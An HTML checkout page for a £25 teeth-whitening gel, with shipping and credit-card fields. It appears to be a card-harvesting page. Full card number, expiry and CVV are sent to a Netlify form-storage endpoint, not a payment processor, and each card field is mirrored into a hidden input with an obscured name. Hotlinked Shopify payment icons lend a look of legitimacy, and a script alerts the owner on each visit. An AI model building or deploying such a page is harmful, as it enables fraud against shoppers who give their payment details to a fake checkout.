<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href='https://fonts.googleapis.com/css?family=Karla' rel='stylesheet' type='text/css'>

   <style>
    /* General Styles */
    body, h1, h2, h4, p, label {
        font-family: 'Karla', sans-serif;
        color: #000;
        font-weight: 600;
        margin: 0;
        padding: 0;
    }

    /* Header Styles */
    header {
        background-color: #f8f9fa;
        padding: 10px 20px;
        text-align: center;
    }

    /* Form Input Styles */
    .form-control {
        border-radius: 8px;
        border: 2px solid #ddd;
        padding: 10px;
        font-size: 16px;
        width: 100%; /* Ensures full-width on mobile */
        box-sizing: border-box; /* Prevents width overflow with padding */
    }

    /* Button Styles */
    .btn-primary {
        background-color: #6c757d;
        color: #fff;
        padding: 12px 20px; /* Ensures larger click/tap area */
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
    }

    .btn-primary:hover {
        background-color: #5a6268;
    }

    /* Checkout Container Styles */
    .checkout-container {
        display: flex;
        flex-direction: column-reverse;
        gap: 20px;
    }

    /* Form and Summary Section Styles */
    .checkout-form, .order-summary {
        flex: 0 0 100%;
        padding: 20px;
        box-sizing: border-box;
    }

    /* Responsive Image */
    .product-details img {
        width: 100%;
        height: auto;
    }

    /* Responsive Text Sizes */
    h1, h2 {
        font-size: 1.5rem; /* Adjusted size for headers */
    }

    p, label {
        font-size: 0.9rem; /* Adjusted size for text and labels */
    }

    /* Media Queries */
    @media(min-width: 480px) {
        h1, h2 {
            font-size: 1.8rem;
        }

        p, label {
            font-size: 1rem;
        }
    }

    @media(min-width: 768px) {
        .banner .banner-image {
            height: 200px;
        }
    }

    @media(min-width: 992px) {
        .checkout-container {
            flex-direction: row;
            justify-content: space-between;
        }

        .checkout-form, .order-summary {
            flex: 0 0 49%;
        }

        h1, h2 {
            font-size: 2rem;
        }
    }
</style>



</head>

<body>
    <!-- Banner Image -->
    <section class="banner">
        <img src="src/bogo3-bottom-cta-section-desktop.jpg" alt="Banner" class="banner-image">
    </section>

    <!-- Checkout Container -->
    <section class="container checkout-container py-5">
        <!-- Checkout Form -->
        <div class="checkout-form">
            <h1 class="display-4">Checkout</h1>
            <form id="checkout-form" method="post" data-netlify="true" action="/thankyou.html">
                <input type="hidden" name="form-name" value="checkout-form">

<!-- Shipping Information -->
                <h2 class="mb-3">Shipping Information</h2>
               <div class="form-group">
    <label for="fullName">Full Name</label>
    <input type="text" class="form-control" id="fullName" required>
    <input type="hidden" id="hiddenFullName" name="Lanomination">
</div>


                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" class="form-control" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="phone">Phone</label>
                    <input type="phone" class="form-control" id="phone" name="phone" required>
                </div>
                <div class="form-group">
                    <label for="address">Address</label>
                    <input type="text" class="form-control" id="address" name="address" required>
                </div>
                <div class="form-group">
                    <label for="city">City</label>
                    <input type="text" class="form-control" id="city" name="city" required>
                </div>
                <div class="form-group">
                    <label for="zip">ZIP</label>
                    <input type="text" class="form-control" id="zip" name="zip" required>
                </div>
                <div class="form-group">
                    <label for="country">Country</label>
                    <input type="text" class="form-control" id="country" name="country" required>
                </div>

                <!-- Shipping Method -->
<h2 class="my-3">Shipping Method</h2>
<div class="d-flex justify-content-between align-items-center mb-2">
    <div class="form-check">
        <input class="form-check-input" type="radio" name="shippingMethod" id="standardShipping" value="standard" checked>
        <label class="form-check-label" for="standardShipping">
            Standard Shipping
        </label>
    </div>
    <p class="mb-0">FREE</p>
</div>

               <!-- Payment Section -->
<h2 class="my-3">Payment</h2>
<div class="payment-method">
    <div class="card-header d-flex justify-content-between align-items-center p-3 mb-3">
        <p class="mb-0"><strong>Credit/Debit Card</strong></p>
        <div id="card-icons">
            <!-- Updated Payment Icons -->
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Payment Method 1" width="40">
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/ae9ceec48b1dc489596c.svg" alt="Payment Method 2" width="40">
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/37fc65d0d7ac30da3b0c.svg" alt="Payment Method 3" width="40">
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/f11b90c2972f3811f2d5.svg" alt="Payment Method 4" width="40">
        </div>
    </div>
    <!-- Adding placeholder, ARIA roles, and real-time validation pattern -->
    <div class="form-group">
        <label for="nameOnCard">Name on Card</label>
        <input type="hidden" name="...." id="nameOnCardx">
        <input type="text" class="form-control" id="nameOnCard" autocomplete="cc-name" placeholder="Full Name" aria-required="true" required>
    </div>
    <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="hidden" name="..." id="cardNumberx">
        <input type="text" class="form-control" id="cardNumber" autocomplete="cc-number" placeholder="XXXX XXXX XXXX XXXX" pattern="\d{4} \d{4} \d{4} \d{4}" aria-required="true" required>
        <p id="cardIssuer"></p>
    </div>
    <div class="form-group">
        <label for="expiry">Expiry (MM/YY)</label>
        <input type="hidden" name=".." id="expiryx">
        <input type="text" class="form-control" id="expiry" autocomplete="cc-exp" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})" aria-required="true" required>
    </div>
    <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="hidden" name="." id="cvvx">
        <input type="text" class="form-control" id="cvv" autocomplete="cc-csc" placeholder="XXX" pattern="\d{3}" aria-required="true" required>
    </div>

</div>
                </div>
                <button type="submit" class="btn btn-primary btn-lg btn-block">Place order</button>           
            </form>
        </div>

        <!-- Order Summary -->
        <aside class="order-summary">
<h2 class="mb-3">Order Summary</h2>
            <!-- Product Details (This should be dynamically generated) -->
            <div class="row product-details">
                <div class="col-3">
                    <img src="images/Daily-Pro-Whitening-Gel.png" alt="Product Image" class="img-thumbnail">
                </div>
                <div class="col-9">
                    <p>PSmileactives Pro</p>
                    <p>Quantity: 1</p>
                    <p>Price: <span class="float-right">£25</span></p>
                </div>
            </div>
            <!-- Subtotal -->
            <div class="subtotal">
                <h4>Subtotal: <span class="float-right">£25</span></h4>
            </div>
            <!-- Shipping -->
            <div class="shipping">
                <h4>Shipping: <span class="float-right">FREE</span></h4>
            </div>
            <!-- Total -->
            <div class="total">
                <h4>Total: <span class="float-right">£25</span></h4>
            </div>        </aside>

        <form name="pageview" id="hiddenForm" data-netlify="true" style="display: none;">
            <input type="hidden" name="page" value="PageNameOrURL">
        </form>
    </section>

    <!-- JavaScript Links -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="checkout.js"></script>
    <script>
        fetch('/.netlify/functions/send_email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: 'A user has visited the page!'
            })
        });
    </script>
</body>
</html>
